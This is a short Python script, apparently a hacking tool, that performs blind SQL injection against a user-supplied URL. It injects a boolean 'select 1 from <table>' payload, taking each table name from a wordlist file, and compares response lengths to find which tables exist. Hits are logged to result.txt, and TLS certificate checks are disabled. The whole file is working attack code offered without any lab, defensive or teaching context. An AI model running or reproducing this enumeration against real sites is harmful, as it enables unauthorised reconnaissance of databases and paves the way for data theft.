from typing import Counter
from colorama.ansi import Fore
import requests, urllib3, time, os

def start(url_input):
    urllib3.disable_warnings()

    test_url = f"{url_input}' and (select 1 from false_example_column limit 0,1)=1--+"
    false_result = requests.get(test_url, verify=False).content
    false_Length = len(false_result)

    table_input = input("\n Enter Your Table List Name : ")
    print('\n')
    table_list_name = table_input.replace('.txt','')

    table = []
    with open(f'{table_list_name}.txt','r') as tt:
        count = 1
        for i in tt:
            print(f'{count} | {i}')
            url = f"{url_input}' and (select 1 from {i} limit 0,1)=1--+"
            result = requests.get(url, verify=False).content
            Length = len(result)
            count += 1

            if Length != false_Length:
                table.append(i)
                print(Fore.LIGHTGREEN_EX+f'A Table Was Founded! ---> {i}\n'+Fore.RESET)

                with open('result.txt','a+') as res:
                    res.write(f'{i}\n')

                time.sleep(5)